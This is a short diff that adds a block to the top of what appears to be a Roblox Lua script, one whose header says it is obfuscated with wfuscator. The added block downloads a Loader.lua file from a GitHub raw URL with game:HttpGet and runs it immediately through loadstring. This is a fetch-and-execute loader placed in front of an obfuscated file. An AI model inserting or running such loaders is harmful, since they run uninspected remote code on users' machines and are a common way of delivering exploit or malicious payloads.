@@ -1,3 +1,6 @@
+spawn(function()
+    (loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
+end)
 --[[
 	Obfuscated with wfuscator <https://whut.dev/wfuscator/>
 	Obfuscation level: STANDARD
